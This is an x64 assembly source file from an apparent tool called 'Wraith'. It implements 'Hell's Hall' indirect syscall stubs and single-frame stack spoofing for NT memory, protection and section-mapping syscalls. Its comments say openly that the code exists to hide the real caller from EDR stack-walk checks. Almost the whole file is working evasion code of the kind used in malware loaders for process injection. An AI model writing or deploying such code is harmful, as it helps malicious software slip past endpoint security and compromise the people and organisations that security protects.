/*
 * src/syscalls/sc_trampoline_x64.S
 *
 * Hell's Hall trampolines, one per syscall. Each stub:
 *
 *  1. Moves RCX to R10 (NTAPI -> kernel calling-convention transfer
 *  for the first argument).
 *  2. Loads the SSN from a writable global into EAX (low 32 bits of
 *  RAX, zero-extended).
 *  3. Indirect-jumps to a `syscall; ret` gadget located inside ntdll.
 *
 * Because the JMP target is inside ntdll, when the kernel returns the
 * stack walk shows the call origin at that gadget (a legitimate
 * unmodified ntdll page) instead of inside our private region.
 *
 * The SSN slots and the gadget pointer live in `.data` so the SSN
 * resolver and gadget finder can populate them at runtime; if both
 * remain zero the C engine routes around the asm stubs and uses direct
 * function pointers instead (graceful degradation under wine or under
 * EDR hardening that breaks pattern detection).
 */

  .intel_syntax noprefix
  .text

#define DECLARE_SC_STUB(name) \
  .global wr_sc_stub_##name ; \
wr_sc_stub_##name: \
  mov r10, rcx ; \
  mov eax, dword ptr [rip + ssn_##name] ; \
  jmp qword ptr [rip + g_gadget]

DECLARE_SC_STUB(NtAllocateVirtualMemory)
DECLARE_SC_STUB(NtProtectVirtualMemory)
DECLARE_SC_STUB(NtFreeVirtualMemory)
DECLARE_SC_STUB(NtFlushInstructionCache)
DECLARE_SC_STUB(NtCreateSection)
DECLARE_SC_STUB(NtMapViewOfSection)
DECLARE_SC_STUB(NtUnmapViewOfSection)
DECLARE_SC_STUB(NtClose)

/*
 * Stack-spoofing variants.
 *
 * Synthetic frame layout established before the jmp:
 *
 *  [rsp+0]  fake_ret  -- a `ret` instruction inside ntdll
 *  [rsp+8]  real_ret  -- caller's actual return address
 *
 * Sequence after kernel returns via SYSRET to gadget's `ret`:
 *
 *  gadget's ret  → pops fake_ret, RIP = ntdll.ret_gadget
 *  ntdll's ret  → pops real_ret, RIP = caller
 *
 * Net effect: during the syscall, any stack walk hits an ntdll
 * address at [rsp]; the real caller is one frame deeper. Full
 * SilentMoonwalk-style chaining (multi-frame masking) is reserved
 * for a future refinement - the single-frame variant is enough to
 * fool a naive RIP-based "is the caller in ntdll?" check.
 *
 * RSP shift compensation. The `push fake_ret` decrements RSP by 8,
 * so any stack-passed argument that the C wrapper deposited at
 * [rsp+0x28..] has been pushed up to [rsp+0x30..]. The x64 kernel
 * still reads arg5 from [rsp+0x28] - if we don't move the args
 * back, it pulls fake_ret (a code pointer) instead of arg5 and the
 * call fails. Symptom observed: NtCreateSection returns 0xC00000F4
 * (STATUS_INVALID_PAGE_PROTECTION) because [rsp+0x28] holds an
 * address rather than a PAGE_* constant.
 *
 * After the push each spoof stub copies N quads from [rsp+0x30..]
 * down to [rsp+0x28..], where N is the number of stack-passed
 * args for that syscall (Microsoft x64 ABI: args 1-4 in regs,
 * args 5+ on the stack, first stack arg at [rsp+0x28] post-CALL).
 *
 *   NtAllocateVirtualMemory   6 args -> 2 stack slots
 *   NtProtectVirtualMemory    5 args -> 1 stack slot
 *   NtFreeVirtualMemory       4 args -> 0 (no shift)
 *   NtFlushInstructionCache   3 args -> 0 (no shift)
 *   NtCreateSection           7 args -> 3 stack slots
 *   NtMapViewOfSection       10 args -> 6 stack slots
 *   NtUnmapViewOfSection      2 args -> 0 (no shift)
 *   NtClose                   1 arg  -> 0 (no shift)
 *
 * R11 is volatile in the Microsoft x64 ABI and not used by the
 * kernel transition (R10 carries arg1, RAX carries SSN), so it's
 * safe as the copy temporary.
 */

/* Empty body for syscalls with <= 4 args (no stack args to shift). */
#define SHIFT_NONE

#define SHIFT_1 \
  mov r11, [rsp + 0x30] ; mov [rsp + 0x28], r11

#define SHIFT_2 \
  mov r11, [rsp + 0x30] ; mov [rsp + 0x28], r11 ; \
  mov r11, [rsp + 0x38] ; mov [rsp + 0x30], r11

#define SHIFT_3 \
  mov r11, [rsp + 0x30] ; mov [rsp + 0x28], r11 ; \
  mov r11, [rsp + 0x38] ; mov [rsp + 0x30], r11 ; \
  mov r11, [rsp + 0x40] ; mov [rsp + 0x38], r11

#define SHIFT_6 \
  mov r11, [rsp + 0x30] ; mov [rsp + 0x28], r11 ; \
  mov r11, [rsp + 0x38] ; mov [rsp + 0x30], r11 ; \
  mov r11, [rsp + 0x40] ; mov [rsp + 0x38], r11 ; \
  mov r11, [rsp + 0x48] ; mov [rsp + 0x40], r11 ; \
  mov r11, [rsp + 0x50] ; mov [rsp + 0x48], r11 ; \
  mov r11, [rsp + 0x58] ; mov [rsp + 0x50], r11

#define DECLARE_SC_STUB_SPOOF(name, shift) \
  .global wr_sc_stub_spoof_##name ; \
wr_sc_stub_spoof_##name: \
  push qword ptr [rip + g_ret_gadget] ; \
  shift ; \
  mov r10, rcx ; \
  mov eax, dword ptr [rip + ssn_##name] ; \
  jmp qword ptr [rip + g_gadget]

DECLARE_SC_STUB_SPOOF(NtAllocateVirtualMemory, SHIFT_2)
DECLARE_SC_STUB_SPOOF(NtProtectVirtualMemory,  SHIFT_1)
DECLARE_SC_STUB_SPOOF(NtFreeVirtualMemory,     SHIFT_NONE)
DECLARE_SC_STUB_SPOOF(NtFlushInstructionCache, SHIFT_NONE)
DECLARE_SC_STUB_SPOOF(NtCreateSection,         SHIFT_3)
DECLARE_SC_STUB_SPOOF(NtMapViewOfSection,      SHIFT_6)
DECLARE_SC_STUB_SPOOF(NtUnmapViewOfSection,    SHIFT_NONE)
DECLARE_SC_STUB_SPOOF(NtClose,                 SHIFT_NONE)

  .data
  .align 8

  .global g_gadget
g_gadget: .quad 0

  /* `ret`-only gadget address (the c3 byte right after syscall in
  * the same Hell's Hall location). Populated by the engine init
  * when WRAITH_USE_STACK_SPOOF is built in. */
  .global g_ret_gadget
g_ret_gadget: .quad 0

  .global ssn_NtAllocateVirtualMemory
ssn_NtAllocateVirtualMemory: .long 0
  .global ssn_NtProtectVirtualMemory
ssn_NtProtectVirtualMemory: .long 0
  .global ssn_NtFreeVirtualMemory
ssn_NtFreeVirtualMemory: .long 0
  .global ssn_NtFlushInstructionCache
ssn_NtFlushInstructionCache: .long 0
  .global ssn_NtCreateSection
ssn_NtCreateSection: .long 0
  .global ssn_NtMapViewOfSection
ssn_NtMapViewOfSection: .long 0
  .global ssn_NtUnmapViewOfSection
ssn_NtUnmapViewOfSection: .long 0
  .global ssn_NtClose
ssn_NtClose: .long 0
